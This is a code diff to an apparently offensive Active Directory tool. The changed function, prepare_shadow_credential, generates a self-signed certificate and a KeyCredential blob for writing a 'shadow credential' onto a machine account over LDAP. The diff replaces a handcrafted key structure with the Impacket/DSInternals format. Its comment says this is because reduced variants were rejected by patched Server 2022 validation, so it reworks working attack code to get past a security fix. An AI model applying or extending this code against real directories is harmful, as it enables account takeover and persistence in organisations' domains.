@@ -1031,33 +1031,23 @@ def prepare_shadow_credential(
 
     target = f"{options.machine.rstrip('$')}$"
     dn = options.ldap_target_dn
-    # MS-ADTS requires computer NGC keys to use a 2048-bit BCRYPT RSA public
-    # key. Include a DeviceId so third-party tooling can identify and remove
-    # this exact value, while omitting the metadata forbidden for SELF writes.
+    # Use the conventional Impacket/DSInternals representation, including its
+    # device, custom-key, and creation-time metadata. Reduced handcrafted
+    # variants were rejected by patched Server 2022 computer-SELF validation.
     key, certificate = shadow_credentials.createSelfSignedX509Certificate(
         target, kSize=2048
     )
     public_key = shadow_credentials.KeyCredential.raw_public_key(key)
 
-    def key_entry(identifier: int, data: bytes) -> bytes:
-        return struct.pack("<HB", len(data), identifier) + data
-
     key_id = hashlib.sha256(public_key).digest()
     device_id = uuid.uuid4()
-    binary_properties = (
-        key_entry(0x03, public_key)
-        + key_entry(0x04, b"\x01")
-        + key_entry(0x05, b"\x00")
-        + key_entry(0x06, device_id.bytes_le)
-    )
-    key_credential = (
-        struct.pack("<I", 0x200)
-        + key_entry(0x01, key_id)
-        + key_entry(0x02, hashlib.sha256(binary_properties).digest())
-        + binary_properties
+    key_credential = shadow_credentials.KeyCredential(
+        key,
+        deviceId=device_id.bytes,
+        currentTime=shadow_credentials.getTicksNow(),
     )
     value = shadow_credentials.toDNWithBinary2String(
-        key_credential, dn
+        key_credential.dumpBinary(), dn
     ).encode("ascii")
     bundle = CertificateBundle(
         certificate,
